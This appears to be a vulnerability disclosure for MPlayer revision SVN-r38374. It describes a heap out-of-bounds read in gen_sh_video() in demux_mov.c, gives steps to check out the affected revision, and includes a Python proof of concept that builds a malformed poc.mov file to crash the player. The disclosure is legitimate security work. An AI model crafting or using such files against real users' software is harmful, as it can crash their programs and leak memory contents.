# mplayer has a heap overflow vulnerability

## Affected versions

SVN-r38374

## Download and installation method

Use the following command to download the latest version of the source code from the mplayer repository:
- svn checkout svn://svn.mplayerhq.hu/mplayer/trunk mplayer
Then enter the mplayer directory and execute the following command to roll back to version 38374 where the vulnerability occurred:
- svn up -r 38374

## Vulnerability Details

There is a heap overflow vulnerability in the gen_sh_video() function in the libmpdemux/demux_mov.c file in the Mplayer source code directory.

<img width="640" alt="image" src="https://github.com/user-attachments/assets/f55596a6-b93b-4115-8f43-cb55693b0227" />

The size of the variable poffs is not checked before using the mp_msg() function to print the prompt information, resulting in an out-of-bounds read of the heap memory and leaking sensitive address information or data in the program.
During the out-of-bounds read process, it is possible that a segment fault occurs when accessing unmapped virtual memory, causing the program to crash.

POC
poc.mov
```
with open("poc.mov", "wb") as f:
    f.write(b'\x00' * 14)  # 14 bytes placeholder
    
    # sps count = 1
    f.write(b'\x01')
    
    f.write(b'\xFF\xFF')
    
    # dummy sps data
    f.write(b'\x00' * 0xFFFF)
    
    # pps count = 0xFF (超大)
    f.write(b'\xFF')
    
    for _ in range(0xFF):
        f.write(b'\xFF\xFF')  # 长度
        f.write(b'\x00' * 0xFFFF)
```
Running poc.mov causes the system to crash
<img width="640" alt="image" src="https://github.com/user-attachments/assets/0e1b2d05-abd7-46f8-9116-37e3e4c153a0" />
